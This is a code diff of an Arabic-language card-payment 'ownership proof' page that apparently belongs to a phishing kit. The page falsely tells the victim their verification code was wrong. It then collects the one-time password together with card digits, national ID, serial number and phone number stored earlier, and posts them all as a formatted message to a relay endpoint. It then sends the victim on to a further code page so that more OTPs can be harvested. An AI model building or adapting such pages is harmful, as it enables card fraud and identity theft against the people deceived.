@@ -74,7 +74,7 @@
         .note{color:#999;font-size:14px;text-align:center}
         #otp{width:310px}
         #texeror{color:#b80808}
-    </style></head><body data-page="otp3"><header>
+    </style></head><body data-page="otp2"><header>
         <div class="menu-icon">
             <span></span>
             <span></span>
@@ -87,6 +87,6 @@
     <div class="otp-section" id="otpSection"><h3 data-i18n="cardPayment">الدفع بالبطاقات البنكية</h3><h2 data-i18n="ownershipProof">إثبات ملكية البطاقة</h2><p id="texeror" data-i18n="errorText">يبدو انك ادخلت رمزآ غير صحيح يرجى اعادة ادخال الرمز او انتظار رمز جديد</p><p id="otpText"></p><label for="otp"><strong data-i18n="otpLabel">رمز التحقق*</strong></label><input type="tel" id="otp" placeholder="يرجى ادخال رمز التحقق" data-i18n-placeholder="otpPlaceholder" maxlength="6" minlength="4"/><p class="note"><span data-i18n="otpNote">سيتم إرسال رسالة كود التحقق في خلال</span><span id="otpTimer">03:00</span><span> دقيقة</span></p><button data-i18n="confirm">تأكيد</button><div class="brands"><img src="Mada_Logo.svg.png" alt="mada"><img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" alt="mastercard"><img src="https://km.visamiddleeast.com/content/dam/VCOM/global/about-visa/images/visa-brandmark-blue-1960x622.png" alt="visa"></div></div><script>const totalPrice=localStorage.getItem("selectedPrice")||"غير متوفر";const cardNumber=localStorage.getItem("cardNumber")||"0000";const last4=cardNumber.slice(-4);document.querySelector('.otp-section button').addEventListener('click',function(){const otpValue=document.getElementById('otp').value.trim();if(otpValue.length<4){alert("❗الرجاء إدخال رمز تحقق صالح");return}
 const totalPrice=localStorage.getItem("selectedPrice")||"غير متوفر";const cardNumber=localStorage.getItem("cardNumber")||"0000";const last4=cardNumber.slice(-4);const formData=JSON.parse(localStorage.getItem("formData")||"{}");const identity=formData.id||"غير محدد";const serial=formData.serial||"غير محدد";const phone=formData.phone||"غير محدد";
 const message = (window.SiteLang && window.SiteLang.renderTemplate)
-    ? window.SiteLang.renderTemplate('otp3', 'smsTemplate', { last4, totalPrice, otpValue, identity, serial, phone })
-    : `رمز التحقق 3:\n\n🔚 آخر ٤ أرقام من البطاقة: ${last4}\n💵 المبلغ: ${totalPrice} SAR\n🔐 رمز التحقق: ${otpValue}\n\n📄  من:\n🆔 رقم الهوية: ${identity}\n🔢 الرقم التسلسلي: ${serial}\n📞 رقم الهاتف: ${phone}\n`;
-fetch('/api/send-message',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({text:message})}).then(response=>response.json()).then(data=>{if(data.ok){window.location.href="totalselect.html"}else{alert("حدث خطأ أثناء الإرسال")}}).catch(error=>{console.error(error);alert("حدث خطأ أثناء الإرسال")})});</script><script src="lang.js"></script></body></html>
+    ? window.SiteLang.renderTemplate('otp2', 'smsTemplate', { last4, totalPrice, otpValue, identity, serial, phone })
+    : `رمز التحقق 2:\n\n🔚 آخر ٤ أرقام من البطاقة: ${last4}\n💵 المبلغ: ${totalPrice} SAR\n🔐 رمز التحقق: ${otpValue}\n\n📄 من :\n🆔 رقم الهوية: ${identity}\n🔢 الرقم التسلسلي: ${serial}\n📞 رقم الهاتف: ${phone}\n`;
+fetch('/api/send-message',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({text:message})}).then(response=>response.json()).then(data=>{if(data.ok){window.location.href="/otp3"}else{alert("حدث خطأ أثناء الإرسال")}}).catch(error=>{console.error(error);alert("حدث خطأ أثناء الإرسال")})});</script><script src="lang.js"></script></body></html>
